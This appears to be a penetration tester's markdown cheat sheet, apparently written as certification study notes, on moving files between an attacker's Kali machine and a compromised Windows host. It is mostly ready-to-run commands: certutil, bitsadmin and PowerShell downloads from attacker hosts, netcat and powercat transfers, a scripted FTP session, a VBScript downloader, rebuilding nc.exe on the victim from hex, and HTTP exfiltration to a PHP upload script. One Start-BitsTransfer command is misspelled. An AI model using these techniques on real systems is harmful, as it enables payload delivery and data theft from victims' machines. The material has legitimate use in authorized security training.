## socat: encrypted file transfer
### step #1: on attacker machine, generate a create a key and a certificate associated with it.
```bash
openssl req -newkey rsa:2048 -nodes -keyout socat.key -x509 -days 1000 -out socat.crt
```
### step #2: on attacker machine,create a pem file from the key and crt files
```bash
cat socat.key socat.crt > socat.pem
```
### step #3: on machine hosting the file:
```bash
socat -d -d OPENSSL-LISTEN:<LPORT>,cert=socat.pem,verify=0,reuseaddr,fork file:file.txt
```
### step #4: on machine receiving the file:
```bash
socat OPENSSL:<LHOST>:<LPORT>,verify=0 file:file.txt,create
```
## Powershell transfer: using .Net WebClient:
```powershell
(New-Object System.Net.WebClient).DownloadFile('<URL>', <OUTPUTPATH>)
```
## file transfer with netcat
### on recieving end
```bash
nc -nlvp 443 > incoming.exe
```
### on sending end
```bash
nc -nv <LHOST> 443 < /path/to/file_to_be_sent.exe
```
## SMB file transfer with impacket's `smbserver.py`
### start server on kali
```bash
smbserver.py <SHARE_NAME> `pwd` -smb2support
```
### copy/move file from share
```shell
xcopy \\<LHOST>\<SHARE_NAME>\<FILE_NAME> c:\windows\temp
```
### copy/move file to share
```shell
xcopy c:\windows\temp\test.txt \\<LHOST>\<SHARE_NAME>\test.txt
```
## using `certutil.exe`
```shell
certutil -f -urlcache HTTP://<LHOST>:<LPORT>/<FILE_NAME> c:\windows\temp\<FILE_NAME>
```
## using `bitsadmin`
```shell
bitsadmin /transfer myDownloadJob /download /priority high http://<LHOST>:<LPORT>/<FILE> c:\windows\temp\<FILE_NAME>
```
## using powershell `Start-BitsTransfer`
```powershell
Start-BitsTrasnfer -Source "HTTP://<LHOST>:<LPORT>/<FILE_NAME>" -Destination c:\windows\temp\<FILE_NAME>
```
## using powercat
### on receiving end:
```bash
nc -lnvp 443 > incoming.exe
```
### on sending end:
```powershell
powercat -c 10.11.0.4 -p 443 -i <PATH\TP\FILE>
```

## using pure-ftpd
```bash
apt update && apt install pure-ftpd
```
*Before any clients can connect to our FTP server,* we need to create a new user for **Pure-FTPd**
```bash
#!/bin/bash
groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /etc ftpuser
pure-pw useradd offsec -u ftpuser -d /ftphome
pure-pw mkdb
cd /etc/pure-ftpd/auth/
ln -s ../conf/PureDB 60pdb
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/
systemctl restart pure-ftpd
```

## using python ftp
```bash
pip install pyftpdlib
python3 -m pyftpdlib -p 21 -u <USERNAME> -P <PASSWORD>
```

## ftp client usage in non-interactive shells
### first: we create the ftp.txt command file
```bash
# this is one cmd
echo open <ATTACKER_FTP_IP> 21 > ftp.txt
echo USER <FTP_USER> >> ftp.txt
echo <FTP_PASSWORD> >> ftp.txt
echo bin >> ftp.txt
echo GET <FILE_NAME> >> ftp.txt
echo bye >> ftp.txt
```
```powershell
# this is for powershell
@'
open 20.20.20.129 21
USER anonymous
anonymous
bin
GET bd.php
bye
'@ > ftp.txt
```
### second: we launch ftp client with `-v` to suppress any returned output, `-n` to suppress automatic login and `-s` to idicate the name of the command file
```bash
ftp -v -n -s:ftp.txt
```

## file transfer using `vbscript`
### first: create the vbscript file
```bash
# this is for cmd
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```
```powershell
# this is for powershell
@'
strUrl = WScript.Arguments.Item(0)
StrFile = WScript.Arguments.Item(1)
Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0
Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0
Const HTTPREQUEST_PROXYSETTING_DIRECT = 1
Const HTTPREQUEST_PROXYSETTING_PROXY = 2
Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts
Err.Clear
Set http = Nothing
Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest")
If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP")
If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP")
http.Open "GET", strURL, False
http.Send
varByteArray = http.ResponseBody
Set http = Nothing
Set fs = CreateObject("Scripting.FileSystemObject")
Set ts = fs.CreateTextFile(StrFile, True)
strData = ""
strBuffer = ""
For lngCounter = 0 to UBound(varByteArray)
ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1)))
Next
ts.Close
'@ > wget.vbs
```
### second use it like below:
```bash
cscript wget.vbs http://<ATTACKER_HTTP_IP>/<FILE_NAME> <FILE_NAME>
```

## file transfer using `upx` and `exe2hex`
relies on compressing the binary  
and transforming it into hexadecimal  
which is rebuildable on the victim machine in the form of cmd echo commands and a powershell small script
### Compression utility: `upx`
```bash
upx -9 <FILE>
```
### example: compressing `nc.exe`. Size shrunk from 59 KBs to 29 KBs.
```
                       Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2020
UPX 3.96        Markus Oberhumer, Laszlo Molnar & John Reiser   Jan 23rd 2020

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
     59392 ->     29696   50.00%    win32/pe     nc.exe                        

Packed 1 file.
```
### using `exe2hex`
```bash
exe2hex -x nc.exe -p nc.cmd
```
### `nc.cmd` script: if copied and pasted into the victim cmd shell, we should get back a fully-functional `nc.exe` binary
```shell
echo|set /p="">nc.hex
echo|set /p="4d5a90000300000004000000ffff0000b800000000000000400000000000000000000000000000000000000000000000000000000000000000000000800000000e1fba0e00b409cd21b8014ccd21546869732070726f6772616d2063616e6e6f742062652072756e20696e20444f53206d6f64652e0d0d0a2400000000000000">>nc.hex
# many lines on the same then
powershell -Command "$h=Get-Content -readcount 0 -path './nc.hex';$l=$h[0].length;$b=New-Object byte[] ($l/2);$x=0;for ($i=0;$i -le $l-1;$i+=2){$b[$x]=[byte]::Parse($h[0].Substring($i,2),[System.Globalization.NumberStyles]::HexNumber);$x+=1};set-content -encoding byte 'nc.exe' -value $b;Remove-Item -force nc.hex;"
```

## Exfiltration with HTTP using powershell
*if outbound HTTP traffic is allowed,*  
we can use the `System.Net.WebClient` **PowerShell** class to upload data to our Kali machine through an HTTP POST request.
### first, we should create the following **PHP** script and save it as `upload.php` in our Kali webroot directory: `/var/www/html`
```php
<?php
$uploaddir = '/var/www/uploads/';
$uploadfile = $uploaddir . $_FILES['file']['name'];
move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
?>
```
### second, we create the `uploads` folder and modify its permissions to grant the `www-data` user ownership (write) permission
```bash
chown www-data: /var/www/uploads
```
### third, on the windows victim PowerShell session, we will invoke the `UploadFile` method from the `System.Net.WebClient` class
```shell
powershell (New-Object System.Net.WebClient).UploadFile('http://<KALI_IP>/upload.php', '<FILE_NAME>')
```

## on legacy systems: TFTP file transfer (older Windows operating systems up to Windows XP and 2003) (TFTP client is not installed by default on systems running Windows 7, Windows 2008, and newer)
### step #1: install and configure TFTP server on kali
```bash
sudo apt update && sudo apt install atftp
sudo mkdir /tftp && sudo chown nobody: /tftp && sudo atftpd --daemon --port 69 /tftp
```
### Step #2: transfer the intended file back to kali
```shell
tftp -i <KALI_IP> put <FILE_NAME>
```

Note: more techniques available on the awesome [**LOLBAS Project**](https://lolbas-project.github.io/)